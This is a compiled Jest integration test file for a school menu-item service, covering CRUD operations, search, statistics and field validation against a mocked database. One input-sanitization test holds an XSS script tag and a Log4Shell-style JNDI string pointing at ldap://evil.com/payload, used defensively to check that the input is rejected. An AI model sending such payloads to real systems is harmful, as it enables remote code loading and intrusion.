"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const menuItem_service_1 = require("../../src/services/menuItem.service");
const menuItem_repository_1 = require("../../src/repositories/menuItem.repository");
const database_service_1 = require("../../src/functions/shared/database.service");
jest.mock('../../src/functions/shared/database.service');
describe('Menu System Integration Tests', () => {
    let mockPrismaClient;
    let mockMenuItem;
    let mockMenuItems;
    let createInput;
    let updateData;
    beforeAll(async () => {
        mockPrismaClient = {
            menuItem: {
                create: jest.fn(),
                findUnique: jest.fn(),
                findFirst: jest.fn(),
                findMany: jest.fn(),
                update: jest.fn(),
                delete: jest.fn(),
                count: jest.fn(),
                groupBy: jest.fn(),
                aggregate: jest.fn(),
                upsert: jest.fn(),
            },
            $transaction: jest.fn(),
            $connect: jest.fn(),
            $disconnect: jest.fn(),
        };
        Object.defineProperty(database_service_1.DatabaseService, 'client', {
            get: jest.fn(() => mockPrismaClient),
            configurable: true
        });
    });
    beforeEach(() => {
        mockMenuItem = {
            id: 'menu-item-123',
            name: 'Classic Masala Dosa',
            description: 'Traditional South Indian crepe filled with spiced potatoes and served with coconut chutney and sambar',
            price: 65.00,
            originalPrice: 75.00,
            category: menuItem_repository_1.MenuCategory.BREAKFAST,
            available: true,
            featured: false,
            imageUrl: 'https://example.com/images/masala-dosa.jpg',
            nutritionalInfo: '{"calories": 350, "protein": "12g", "carbs": "45g", "fat": "8g"}',
            allergens: '["gluten", "dairy"]',
            tags: '["vegetarian", "traditional", "south-indian"]',
            preparationTime: 15,
            portionSize: '1 piece',
            calories: 350,
            schoolId: 'school-123',
            vendorId: 'vendor-456',
            sortOrder: 10,
            metadata: '{"spiceLevel": "medium", "region": "south-india"}',
            createdAt: new Date('2024-01-15T10:00:00Z'),
            updatedAt: new Date('2024-01-15T10:00:00Z'),
            school: {
                id: 'school-123',
                name: 'Greenwood International School',
                address: '123 Education Street, Bangalore'
            },
            vendor: {
                id: 'vendor-456',
                name: 'South Indian Delights',
                contactEmail: 'contact@sidel.com'
            }
        };
        mockMenuItems = [mockMenuItem];
        createInput = {
            name: 'Classic Masala Dosa',
            description: 'Traditional South Indian crepe filled with spiced potatoes',
            price: 65.00,
            originalPrice: 75.00,
            category: menuItem_repository_1.MenuCategory.BREAKFAST,
            imageUrl: 'https://example.com/images/masala-dosa.jpg',
            nutritionalInfo: '{"calories": 350, "protein": "12g"}',
            allergens: '["gluten", "dairy"]',
            tags: '["vegetarian", "traditional"]',
            preparationTime: 15,
            portionSize: '1 piece',
            calories: 350,
            schoolId: 'school-123',
            vendorId: 'vendor-456'
        };
        updateData = {
            name: 'Premium Masala Dosa',
            price: 85.00,
            featured: true,
            tags: '["vegetarian", "premium", "traditional"]'
        };
        jest.clearAllMocks();
    });
    afterAll(async () => {
        jest.restoreAllMocks();
    });
    describe('Menu Item Creation', () => {
        it('should successfully create a new menu item with all required fields', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.create.mockResolvedValue(mockMenuItem);
            mockDbClient.menuItem.findFirst.mockResolvedValue(null);
            const result = await menuItem_service_1.MenuItemService.create(createInput);
            expect(result).toEqual(mockMenuItem);
            expect(mockDbClient.menuItem.create).toHaveBeenCalledWith({
                data: expect.objectContaining({
                    name: createInput.name,
                    description: createInput.description,
                    price: createInput.price,
                    category: createInput.category
                }),
                include: expect.objectContaining({
                    school: true,
                    vendor: true
                })
            });
            expect(result.name).toBe('Classic Masala Dosa');
            expect(result.price).toBe(65.00);
            expect(result.category).toBe(menuItem_repository_1.MenuCategory.BREAKFAST);
            expect(result.available).toBe(true);
        });
        it('should throw error for duplicate menu item name in same school', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findFirst.mockResolvedValue(mockMenuItem);
            await expect(menuItem_service_1.MenuItemService.create(createInput)).rejects.toThrow('A menu item with this name already exists in this school');
        });
        it('should validate required fields', async () => {
            const invalidInput = { ...createInput, name: '' };
            await expect(menuItem_service_1.MenuItemService.create(invalidInput)).rejects.toThrow();
        });
        it('should validate price constraints', async () => {
            const invalidPriceInput = { ...createInput, price: 15000 };
            await expect(menuItem_service_1.MenuItemService.create(invalidPriceInput)).rejects.toThrow('Price cannot exceed ₹10,000');
        });
        it('should set default values for optional fields', async () => {
            const minimalInput = {
                name: 'Simple Dosa',
                description: 'Plain dosa',
                price: 45.00,
                category: menuItem_repository_1.MenuCategory.BREAKFAST,
                currency: 'INR',
                schoolId: 'school-123'
            };
            const mockDbClient = database_service_1.DatabaseService.client;
            const expectedItem = { ...mockMenuItem, ...minimalInput, available: true, featured: false };
            mockDbClient.menuItem.create.mockResolvedValue(expectedItem);
            mockDbClient.menuItem.findFirst.mockResolvedValue(null);
            const result = await menuItem_service_1.MenuItemService.create(minimalInput);
            expect(result.available).toBe(true);
            expect(result.featured).toBe(false);
            expect(mockDbClient.menuItem.create).toHaveBeenCalledWith({
                data: expect.objectContaining({
                    available: true,
                    featured: false
                }),
                include: expect.any(Object)
            });
        });
        it('should validate nutritional information format', async () => {
            const invalidNutritionalInput = {
                ...createInput,
                nutritionalInfo: 'invalid-json'
            };
            await expect(menuItem_service_1.MenuItemService.create(invalidNutritionalInput)).rejects.toThrow('Invalid nutritional information format');
        });
        it('should validate allergens format', async () => {
            const invalidAllergensInput = {
                ...createInput,
                allergens: 'not-an-array'
            };
            await expect(menuItem_service_1.MenuItemService.create(invalidAllergensInput)).rejects.toThrow('Invalid allergens format');
        });
    });
    describe('Menu Item Retrieval', () => {
        it('should successfully retrieve menu item by ID', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findUnique.mockResolvedValue(mockMenuItem);
            const result = await menuItem_service_1.MenuItemService.findById('menu-item-123');
            expect(result).toEqual(mockMenuItem);
            expect(mockDbClient.menuItem.findUnique).toHaveBeenCalledWith({
                where: { id: 'menu-item-123' },
                include: expect.objectContaining({
                    school: true,
                    vendor: true
                })
            });
        });
        it('should return null for non-existent menu item', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findUnique.mockResolvedValue(null);
            const result = await menuItem_service_1.MenuItemService.findById('non-existent');
            expect(result).toBeNull();
        });
        it('should get menu items by school', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findMany.mockResolvedValue(mockMenuItems);
            const result = await menuItem_service_1.MenuItemService.findBySchool('school-123', false);
            expect(result).toEqual(mockMenuItems);
            expect(mockDbClient.menuItem.findMany).toHaveBeenCalledWith({
                where: {
                    schoolId: 'school-123'
                },
                orderBy: { name: 'asc' }
            });
        });
        it('should get menu items by category', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findMany.mockResolvedValue(mockMenuItems);
            const result = await menuItem_service_1.MenuItemService.findByCategory('school-123', menuItem_repository_1.MenuCategory.BREAKFAST);
            expect(result).toEqual(mockMenuItems);
            expect(mockDbClient.menuItem.findMany).toHaveBeenCalledWith({
                where: {
                    schoolId: 'school-123',
                    category: menuItem_repository_1.MenuCategory.BREAKFAST,
                    available: true
                },
                orderBy: { name: 'asc' }
            });
        });
    });
    describe('Menu Item Search', () => {
        it('should search menu items by name and description', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findMany.mockResolvedValue(mockMenuItems);
            const result = await menuItem_service_1.MenuItemService.search('school-123', 'dosa');
            expect(result).toEqual(mockMenuItems);
            expect(mockDbClient.menuItem.findMany).toHaveBeenCalledWith({
                where: {
                    schoolId: 'school-123',
                    available: true,
                    OR: [
                        { name: { contains: 'dosa' } },
                        { description: { contains: 'dosa' } }
                    ]
                },
                orderBy: { name: 'asc' }
            });
        });
        it('should return empty array for empty search term', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findMany.mockResolvedValue([]);
            const result = await menuItem_service_1.MenuItemService.search('school-123', '');
            expect(result).toEqual([]);
        });
        it('should handle search with query', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findMany.mockResolvedValue(mockMenuItems);
            const result = await menuItem_service_1.MenuItemService.search('school-123', 'healthy');
            expect(result).toEqual(mockMenuItems);
            expect(mockDbClient.menuItem.findMany).toHaveBeenCalledWith({
                where: {
                    schoolId: 'school-123',
                    available: true,
                    OR: [
                        { name: { contains: 'healthy' } },
                        { description: { contains: 'healthy' } }
                    ]
                },
                orderBy: { name: 'asc' }
            });
        });
    });
    describe('Menu Item Updates', () => {
        it('should successfully update menu item', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findUnique.mockResolvedValue(mockMenuItem);
            mockDbClient.menuItem.update.mockResolvedValue({
                ...mockMenuItem,
                ...updateData
            });
            menuItem_repository_1.MenuItemRepository.nameExists = jest.fn().mockResolvedValue(false);
            const result = await menuItem_service_1.MenuItemService.updateMenuItem('menu-item-123', updateData);
            expect(result.name).toBe('Premium Masala Dosa');
            expect(result.featured).toBe(true);
            expect(mockDbClient.menuItem.update).toHaveBeenCalledWith({
                where: { id: 'menu-item-123' },
                data: expect.objectContaining({
                    name: 'Premium Masala Dosa',
                    price: 85.00,
                    featured: true
                }),
                include: expect.objectContaining({
                    school: true,
                    vendor: true
                })
            });
        });
        it('should throw error when updating non-existent menu item', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findUnique.mockResolvedValue(null);
            await expect(menuItem_service_1.MenuItemService.updateMenuItem('non-existent', { name: 'New Name' })).rejects.toThrow('Menu item not found');
        });
        it('should validate name uniqueness when updating', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findUnique.mockResolvedValue(mockMenuItem);
            menuItem_repository_1.MenuItemRepository.nameExists = jest.fn().mockResolvedValue(true);
            await expect(menuItem_service_1.MenuItemService.updateMenuItem('menu-item-123', { name: 'Existing Name' })).rejects.toThrow('A menu item with this name already exists');
        });
        it('should validate price updates', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findUnique.mockResolvedValue(mockMenuItem);
            await expect(menuItem_service_1.MenuItemService.updateMenuItem('menu-item-123', { price: -10 })).rejects.toThrow('Price must be a positive number');
        });
        it('should update availability status', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findUnique.mockResolvedValue(mockMenuItem);
            mockDbClient.menuItem.update.mockResolvedValue({
                ...mockMenuItem,
                available: false
            });
            const result = await menuItem_service_1.MenuItemService.updateMenuItem('menu-item-123', { available: false });
            expect(result.available).toBe(false);
            expect(mockDbClient.menuItem.update).toHaveBeenCalledWith({
                where: { id: 'menu-item-123' },
                data: expect.objectContaining({
                    available: false
                }),
                include: expect.any(Object)
            });
        });
    });
    describe('Menu Item Deletion', () => {
        it('should soft delete menu item by default', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findUnique.mockResolvedValue(mockMenuItem);
            mockDbClient.menuItem.update.mockResolvedValue({
                ...mockMenuItem,
                available: false
            });
            const result = await menuItem_service_1.MenuItemService.deleteMenuItem('menu-item-123', false);
            expect(result.available).toBe(false);
            expect(mockDbClient.menuItem.update).toHaveBeenCalledWith({
                where: { id: 'menu-item-123' },
                data: { available: false }
            });
        });
        it('should hard delete menu item when requested', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findUnique.mockResolvedValue(mockMenuItem);
            mockDbClient.menuItem.delete.mockResolvedValue(mockMenuItem);
            const result = await menuItem_service_1.MenuItemService.deleteMenuItem('menu-item-123', true);
            expect(result).toEqual(mockMenuItem);
            expect(mockDbClient.menuItem.delete).toHaveBeenCalledWith({
                where: { id: 'menu-item-123' }
            });
        });
        it('should throw error when deleting non-existent menu item', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findUnique.mockResolvedValue(null);
            await expect(menuItem_service_1.MenuItemService.deleteMenuItem('non-existent', false)).rejects.toThrow('Menu item not found');
        });
    });
    describe('Menu Statistics', () => {
        it('should get menu statistics by category', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.groupBy.mockResolvedValue([
                { category: menuItem_repository_1.MenuCategory.BREAKFAST, _count: { category: 15 } },
                { category: menuItem_repository_1.MenuCategory.LUNCH, _count: { category: 20 } },
                { category: menuItem_repository_1.MenuCategory.SNACKS, _count: { category: 10 } }
            ]);
            mockDbClient.menuItem.aggregate.mockResolvedValue({
                _avg: { price: 75.25 }
            });
            const stats = await menuItem_service_1.MenuItemService.getMenuStats();
            expect(stats).toEqual({
                totalItems: 45,
                averagePrice: 75.25,
                byCategory: {
                    [menuItem_repository_1.MenuCategory.BREAKFAST]: 15,
                    [menuItem_repository_1.MenuCategory.LUNCH]: 20,
                    [menuItem_repository_1.MenuCategory.SNACKS]: 10
                }
            });
        });
        it('should get school-specific menu statistics', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            const schoolId = 'school-123';
            mockDbClient.menuItem.groupBy.mockResolvedValue([
                { category: menuItem_repository_1.MenuCategory.BREAKFAST, _count: { category: 8 } }
            ]);
            mockDbClient.menuItem.aggregate.mockResolvedValue({
                _avg: { price: 65.50 }
            });
            const stats = await menuItem_service_1.MenuItemService.getMenuStats(schoolId);
            expect(stats.totalItems).toBe(8);
            expect(stats.averagePrice).toBe(65.50);
            expect(mockDbClient.menuItem.groupBy).toHaveBeenCalledWith({
                by: ['category'],
                _count: { category: true },
                where: { schoolId }
            });
        });
        it('should handle empty statistics gracefully', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.groupBy.mockResolvedValue([]);
            mockDbClient.menuItem.aggregate.mockResolvedValue({
                _avg: { price: null }
            });
            const stats = await menuItem_service_1.MenuItemService.getMenuStats();
            expect(stats).toEqual({
                totalItems: 0,
                averagePrice: 0,
                byCategory: {}
            });
        });
    });
    describe('Business Logic Validation', () => {
        it('should enforce price validation rules', async () => {
            await expect(menuItem_service_1.MenuItemService.createMenuItem({ ...createInput, price: -10 })).rejects.toThrow('Price must be a positive number');
            await expect(menuItem_service_1.MenuItemService.createMenuItem({ ...createInput, price: 0 })).rejects.toThrow('Price must be a positive number');
            await expect(menuItem_service_1.MenuItemService.createMenuItem({ ...createInput, price: 15000 })).rejects.toThrow('Price cannot exceed ₹10,000');
        });
        it('should enforce original price validation', async () => {
            await expect(menuItem_service_1.MenuItemService.createMenuItem({
                ...createInput,
                price: 100,
                originalPrice: 80
            })).rejects.toThrow('Original price must be higher than current price');
        });
        it('should enforce preparation time constraints', async () => {
            await expect(menuItem_service_1.MenuItemService.createMenuItem({
                ...createInput,
                preparationTime: 0
            })).rejects.toThrow('Preparation time must be between 1 and 480 minutes');
            await expect(menuItem_service_1.MenuItemService.createMenuItem({
                ...createInput,
                preparationTime: 500
            })).rejects.toThrow('Preparation time must be between 1 and 480 minutes');
        });
        it('should enforce calorie constraints', async () => {
            await expect(menuItem_service_1.MenuItemService.createMenuItem({
                ...createInput,
                calories: -100
            })).rejects.toThrow('Calories must be between 0 and 5000');
            await expect(menuItem_service_1.MenuItemService.createMenuItem({
                ...createInput,
                calories: 6000
            })).rejects.toThrow('Calories must be between 0 and 5000');
        });
        it('should validate portion size format', async () => {
            await expect(menuItem_service_1.MenuItemService.createMenuItem({
                ...createInput,
                portionSize: ''
            })).rejects.toThrow('Portion size is required');
            await expect(menuItem_service_1.MenuItemService.createMenuItem({
                ...createInput,
                portionSize: 'x'.repeat(101)
            })).rejects.toThrow('Portion size must be 100 characters or less');
        });
        it('should validate menu category enum', async () => {
            await expect(menuItem_service_1.MenuItemService.createMenuItem({
                ...createInput,
                category: 'INVALID_CATEGORY'
            })).rejects.toThrow('Invalid menu category');
        });
    });
    describe('Data Integrity and Relationships', () => {
        it('should maintain referential integrity with school', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.create.mockRejectedValue(new Error('Foreign key constraint failed'));
            menuItem_repository_1.MenuItemRepository.nameExists = jest.fn().mockResolvedValue(false);
            await expect(menuItem_service_1.MenuItemService.createMenuItem({
                ...createInput,
                schoolId: 'non-existent-school'
            })).rejects.toThrow();
        });
        it('should maintain referential integrity with vendor', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.create.mockRejectedValue(new Error('Foreign key constraint failed'));
            menuItem_repository_1.MenuItemRepository.nameExists = jest.fn().mockResolvedValue(false);
            await expect(menuItem_service_1.MenuItemService.createMenuItem({
                ...createInput,
                vendorId: 'non-existent-vendor'
            })).rejects.toThrow();
        });
        it('should handle cascade operations correctly', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findUnique.mockResolvedValue({
                ...mockMenuItem,
                school: { ...mockMenuItem.schoolId },
                vendor: { ...mockMenuItem.vendorId }
            });
            const result = await menuItem_service_1.MenuItemService.getMenuItemById('menu-item-123');
            expect(result?.schoolId).toBeDefined();
            expect(result?.vendorId).toBeDefined();
            expect(result?.schoolId).toBe('school-123');
            expect(result?.vendorId).toBe('vendor-456');
        });
    });
    describe('Performance and Scalability', () => {
        it('should handle large result sets with pagination', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            const largeResultSet = Array.from({ length: 1000 }, (_, i) => ({
                ...mockMenuItem,
                id: `menu-item-${i}`,
                name: `Menu Item ${i}`
            }));
            mockDbClient.menuItem.findMany.mockResolvedValue(largeResultSet.slice(0, 50));
            mockDbClient.menuItem.count.mockResolvedValue(1000);
            const result = await menuItem_service_1.MenuItemService.getMenuItems({}, { page: 1, limit: 50 });
            expect(result.items).toHaveLength(50);
            expect(result.total).toBe(1000);
            expect(result.totalPages).toBe(20);
            expect(mockDbClient.menuItem.findMany).toHaveBeenCalledWith(expect.objectContaining({
                take: 50,
                skip: 0
            }));
        });
        it('should optimize queries with proper indexing hints', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findMany.mockResolvedValue(mockMenuItems);
            await menuItem_service_1.MenuItemService.getMenuItems({ category: menuItem_repository_1.MenuCategory.BREAKFAST, available: true }, { page: 1, limit: 10 });
            expect(mockDbClient.menuItem.findMany).toHaveBeenCalledWith({
                where: expect.objectContaining({
                    category: menuItem_repository_1.MenuCategory.BREAKFAST,
                    available: true
                }),
                include: expect.any(Object),
                orderBy: { name: 'asc' },
                skip: 0,
                take: 10
            });
        });
        it('should handle concurrent operations gracefully', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findUnique.mockResolvedValue(mockMenuItem);
            mockDbClient.menuItem.update.mockImplementation(() => {
                throw new Error('Concurrent modification detected');
            });
            await expect(menuItem_service_1.MenuItemService.updateMenuItem('menu-item-123', { price: 100 })).rejects.toThrow('Concurrent modification detected');
        });
    });
    describe('Error Handling and Edge Cases', () => {
        it('should handle database connection errors gracefully', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findUnique.mockRejectedValue(new Error('Database connection failed'));
            await expect(menuItem_service_1.MenuItemService.getMenuItemById('menu-item-123')).rejects.toThrow('Database connection failed');
        });
        it('should handle malformed JSON in nutritional info', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findUnique.mockResolvedValue({
                ...mockMenuItem,
                nutritionalInfo: 'malformed-json'
            });
            const result = await menuItem_service_1.MenuItemService.getMenuItemById('menu-item-123');
            expect(result?.nutritionalInfo).toBe('malformed-json');
        });
        it('should validate input sanitization', async () => {
            const maliciousInput = {
                ...createInput,
                name: '<script>alert("xss")</script>',
                description: '${jndi:ldap://evil.com/payload}'
            };
            menuItem_repository_1.MenuItemRepository.nameExists = jest.fn().mockResolvedValue(false);
            await expect(menuItem_service_1.MenuItemService.createMenuItem(maliciousInput)).rejects.toThrow('Invalid characters in input');
        });
        it('should handle empty search results', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.findMany.mockResolvedValue([]);
            mockDbClient.menuItem.count.mockResolvedValue(0);
            const result = await menuItem_service_1.MenuItemService.searchMenuItems('nonexistent', {}, {});
            expect(result).toEqual({
                items: [],
                total: 0,
                page: 1,
                limit: 10,
                totalPages: 0
            });
        });
    });
    describe('Integration with External Systems', () => {
        it('should handle vendor service integration', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.create.mockResolvedValue(mockMenuItem);
            menuItem_repository_1.MenuItemRepository.nameExists = jest.fn().mockResolvedValue(false);
            const result = await menuItem_service_1.MenuItemService.createMenuItem(createInput);
            expect(result.vendorId).toBeDefined();
            expect(result.vendorId).toBe('vendor-456');
        });
        it('should handle school service integration', async () => {
            const mockDbClient = database_service_1.DatabaseService.client;
            mockDbClient.menuItem.create.mockResolvedValue(mockMenuItem);
            menuItem_repository_1.MenuItemRepository.nameExists = jest.fn().mockResolvedValue(false);
            const result = await menuItem_service_1.MenuItemService.createMenuItem(createInput);
            expect(result.schoolId).toBeDefined();
            expect(result.schoolId).toBe('school-123');
        });
    });
});
//# sourceMappingURL=menu-system.integration.test.js.map